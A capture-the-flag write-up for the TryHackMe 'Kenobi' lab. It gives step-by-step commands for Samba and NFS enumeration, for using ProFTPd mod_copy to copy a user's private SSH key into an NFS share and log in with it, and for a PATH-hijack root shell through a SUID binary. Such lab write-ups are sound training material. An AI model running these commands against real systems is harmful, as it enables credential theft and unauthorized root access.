Kenobi

TryHackMe · Easy by Brenno M.

Kenobi chains Samba and NFS enumeration, exploits ProFTPd (mod_copy) to stage the SSH key into a mountable directory, and finally escalates via PATH hijacking on a SUID binary.

Reconnaissance

Nmap reveals FTP (ProFTPd 1.3.5), SSH, HTTP, Samba and NFS. The anonymous Samba share yields a log pointing at the SSH key in /home/kenobi/.ssh/id_rsa. NFS exports /var.

nmap -sC -sV <IP>
smbclient //<IP>/anonymous -N
get log.txt
nmap -p111 --script=nfs-ls,nfs-showmount <IP>

Exploitation - ProFTPd mod_copy

ProFTPd 1.3.5 is vulnerable to mod_copy (SITE CPFR/CPTO), which copies files without authentication. Copy id_rsa into /var (NFS-exported), mount the share and grab the key.

nc <IP> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

sudo mount <IP>:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@<IP>

Privilege escalation

Searching for SUID binaries highlights /usr/bin/menu, which calls curl by relative path. Hijacking PATH forces a root shell.

find / -perm -u=s -type f 2>/dev/null
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
